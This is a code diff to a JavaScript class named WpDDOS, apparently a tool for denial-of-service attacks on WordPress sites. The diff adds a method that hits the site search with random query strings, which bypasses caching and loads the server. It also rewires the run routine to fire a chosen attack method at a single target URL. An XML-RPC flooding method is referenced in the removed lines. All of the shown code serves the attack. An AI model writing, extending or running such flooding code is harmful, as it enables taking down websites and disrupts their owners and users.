@@ -8,8 +8,9 @@ let config = require('./config');
 
 
 class WpDDOS {
-    constructor(urls) {
-        this.urls = urls;
+    constructor(url, method) {
+        this.url = url;
+        this.method = method;
     }
 
     getHomePage(url) {
@@ -81,15 +82,22 @@ class WpDDOS {
                 this.printError(fullUrl,err);
             });
     }
+    getWpSearch(url) {
+        let randStr = Math.random().toString(36).substring(7);
+        let fullUrl = `${url}?s=${randStr}`;
+
+        return rp(fullUrl)
+            .then(()=>{
+                this.printOk(url);
+            })
+            .catch((err)=>{
+                this.printError(fullUrl,err);
+            });
+    }
 
     runAll() {
-        let urls = this.urls;
-        for (let i in urls) {
-            //this.getHomePage(urls[i]);
-            //this.getRandomWp(urls[i]);
-            this.postRandomXmlRpc(urls[i]);
-        }
-
+        let task = this[this.method];
+        task.call(this, this.url);
     }
 
 }
